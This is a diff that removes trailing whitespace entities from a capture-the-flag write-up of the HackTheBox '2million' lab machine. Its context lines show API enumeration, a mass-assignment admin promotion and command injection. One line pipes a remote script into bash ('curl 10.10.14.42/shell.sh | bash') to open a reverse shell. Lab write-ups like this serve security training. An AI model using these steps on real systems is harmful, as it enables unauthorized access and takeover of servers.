@@ -41,7 +41,7 @@ I didn't have an invite code, so we'll have to leave this for now. I also don't 
 
 <figure><img src="../../../.gitbook/assets/image (2308).png" alt=""><figcaption></figcaption></figure>
 
-There was a `register` directory present.&#x20;
+There was a `register` directory present.
 
 <figure><img src="../../../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>
 
@@ -78,7 +78,7 @@ In order to generate the invite code, make a POST request to \/api\/v1\/invite\/
 ```
 {% endcode %}
 
-Following these instructions, we can get the invite code we need.&#x20;
+Following these instructions, we can get the invite code we need.
 
 {% code overflow="wrap" %}
 ```
@@ -96,7 +96,7 @@ Using this, we can finally register and login to view the dashboard:
 
 ### API Enumeration -> Injection
 
-The thing that stands out the most is the fact that thereis an ongoing database migration for the site, and that some features are unavailable. There wasn't much functionality within this site, so I visited the `/api/v1` directory that we used earlier to generate the invite code.&#x20;
+The thing that stands out the most is the fact that thereis an ongoing database migration for the site, and that some features are unavailable. There wasn't much functionality within this site, so I visited the `/api/v1` directory that we used earlier to generate the invite code.
 
 Since we are an 'authenticated user',  I grabbed our cookie and visited it, revealing more about the API routes present:
 
@@ -137,7 +137,7 @@ $ curl -H 'Cookie: PHPSESSID=1mf4jaa8fv6rob72cp60rbe9ri' http://2million.htb/api
 ```
 {% endcode %}
 
-If we were to visit the iste without the cookie specified, then we would not be able to view this information. Our next goal here is to become the administrator of the site. Naturally, the "Update user settings" bit looks the most vulnerable.&#x20;
+If we were to visit the iste without the cookie specified, then we would not be able to view this information. Our next goal here is to become the administrator of the site. Naturally, the "Update user settings" bit looks the most vulnerable.
 
 If we send a PUT request to it without any information, we get this:
 
@@ -156,7 +156,7 @@ Content-Length: 53
 {"status":"danger","message":"Invalid content type."}
 ```
 
-Since this is using JSON, let's change the Content-Type header to that. Then, it complains about another error.&#x20;
+Since this is using JSON, let's change the Content-Type header to that. Then, it complains about another error.
 
 ```json
 {"status":"danger","message":"Missing parameter: email"}
@@ -172,7 +172,7 @@ Setting the value of that to 1 seems to work:
 
 <figure><img src="../../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>
 
-We can verify that we are an admin using the `/api/v1/admin/auth` endpoint.&#x20;
+We can verify that we are an admin using the `/api/v1/admin/auth` endpoint.
 
 ```
 $ curl -H 'Cookie: PHPSESSID=1mf4jaa8fv6rob72cp60rbe9ri' http://2million.htb/api/v1/admin/auth
@@ -204,7 +204,7 @@ $ curl -X POST -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=1mf4jaa
 
 <figure><img src="../../../.gitbook/assets/image (2364).png" alt=""><figcaption></figcaption></figure>
 
-We can get a reverse shell by replacing the command with `curl 10.10.14.42/shell.sh | bash`.&#x20;
+We can get a reverse shell by replacing the command with `curl 10.10.14.42/shell.sh | bash`.
 
 {% code overflow="wrap" %}
 ```
@@ -216,7 +216,7 @@ $ curl -X POST -H 'Content-Type: application/json' -H 'Cookie: PHPSESSID=1mf4jaa
 
 ## Privilege Escalation
 
-We cannot grab the user flag from the `admin` user just yet.&#x20;
+We cannot grab the user flag from the `admin` user just yet.
 
 ### Admin Creds
 
@@ -347,4 +347,4 @@ The HackTheBox Team
 ```
 {% endcode %}
 
-This was a nice end to their milestone box. All in all, great website that has helped me immensely (and also frustrated me greatly...). Thank you HTB!&#x20;
+This was a nice end to their milestone box. All in all, great website that has helped me immensely (and also frustrated me greatly...). Thank you HTB!
